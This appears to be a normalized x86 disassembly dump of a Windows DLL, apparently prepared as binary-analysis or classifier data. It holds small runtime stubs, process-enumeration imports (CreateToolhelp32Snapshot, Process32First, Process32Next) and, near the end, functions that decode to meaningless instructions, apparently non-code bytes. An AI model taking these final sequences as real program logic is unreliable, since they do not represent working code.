push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_10007cdf
add esp 0x10
retn
sub_10008305
call sub_1000909a
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp sub_10008f8f
sub_1000867e
push 0x9
call sub_10005c23
pop ecx
retn
sub_10008707
push 0x9
call sub_10005c23
pop ecx
retn
sub_10008bf8
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xfffffffd
call sub_10008820
pop ecx
mov [ rw-data ] 0x1
sub_10008f6d
mov eax [ esp + 0x4 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax * 4 + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
retn
sub_1000909a
push 0x1
call sub_100090a3
pop ecx
retn
sub_10009147
push 0x2
call sub_10004776
pop ecx
retn
sub_10009260
push 0x1
pop eax
retn
sub_10009314
push 0x1
pop eax
retn
sub_10009498
push 0x1
pop eax
retn
sub_10009d50
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push 0xf
push edx
call sub_10009c40
add esp 0x10
retn
sub_1000b140
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
push eax
push ecx
call sub_100085e5
add esp 0x8
retn
sub_1000b160
mov eax [ esp + 0x8 ]
push eax
call sub_1000440b
pop ecx
retn
sub_1000b960
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
mov ecx [ eax + 0x28 ]
push ecx
call [ eax + 0x24 ]
add esp 0x8
retn
sub_1000c080
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax ] ecx
mov eax [ rw-data ]
mov ecx [ esp + 0xc ]
mov [ edx ] eax
mov edx [ esp + 0x10 ]
xor eax eax
mov [ ecx ] rw-data
mov [ edx ] rw-data
retn
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_10018f99
bound esi [ ecx ]
outsd
push edi
cld
lea edx [ edi ]
retn
sub_1001900a
xor ecx [ edi + edx * 2 + 0x342f22f3 ]
iretd
sub_100190e2
cmp [ ebx ] 0x1d389583
push edi
hlt
sub_10038ed7
push ebp
or ch al
mov cl bh
dec ecx
inc esp
0x9cde8cc 0xea44
sub_1003ac32
test [ eax - 0x561697b0 ] bh
test [ ebx ] ch
inc esp
pop ebx
inc esp
push 0x40
lodsd [ esi ]
leave
nop
0xdcea
